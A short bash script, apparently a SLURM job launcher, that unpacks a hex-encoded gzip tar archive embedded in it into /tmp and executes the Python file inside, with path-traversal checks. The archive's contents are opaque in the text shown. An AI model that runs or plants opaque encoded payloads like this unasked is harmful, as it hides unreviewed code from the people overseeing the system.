#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d8fdb201086f7ec5f8172b12d4504dbf82bab1c7befa1eda55aad301e276413db02d2ddb4ea7f2fd8d12a6da5de76b755e739186333efc00c038ceecdd0dfbc28cc513036b5ecf7966559fefc3e7f2fca92dd10f6b2d39a39192bb473f91abefe42be2decf000fd624d160d4b4056a528bab46e164bb218c5f93088f6deec449a177e48dd36552e8a264d80354c2645d901afdab464ac6dea96675ce45999b3a4930d746d21eaae2bdbba833c853a4fe5b56a73b6609c689ed6699632ffe720fa2b67a2cc459a8a4a3251c8b262b5d32e0a997639af645ae6199382b72de71de7d09455c29b2c615cf03ced12807cf1fdad83fb0fc0e8787e711f7faeff2449f8aff5cf7986f5ff1aa8e338684bccd92cfd45b0dc09b33ba866e982d2a903049d1e8e6414d67f2497c1ef5d37d01bdf44ce900abdfdf239b98b6fe5c66b505fde268af42a64d3ed12c65483ab780b4f368ae340cca6e16ad4c31ea45dc9e1783cf5ca9e57fbfd194efd368c57f273389d4ce19d97b1dbaf61208c01e7fe32453a9f149198c5a7e3c4a9d31d3cb56a0bc6b9da6c9ccacfa75878173c2abb2397f5d161843e12311186d87540ba411320aa9f3a4475a41f2c01da8b2350bf51acf1d6513868b913babddf256c15c66b39f456f527b8b651c63b8862e224434a43af3aad7b968be9e8e5d65a2803e493389ce09dd6838ec28fbd119d9fc478b261ec24c78d0be518ae66c3dbd15b426fe9f1a1553a9a3b66f3419f60094fcad8fbe161eac56ee8a356162ec1b1d425400b69a789c19c159f109f449f63aa7a1fe1882d8dd5d1e4d4fd9db6c0d582e97e78de0a47a1fac03f221d076fbd9711044110044110044110044110044110044110044110e47fe5070cfe212d00280000')
r=Path('/tmp')/('a'+j+'b01ec87a6f29b')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
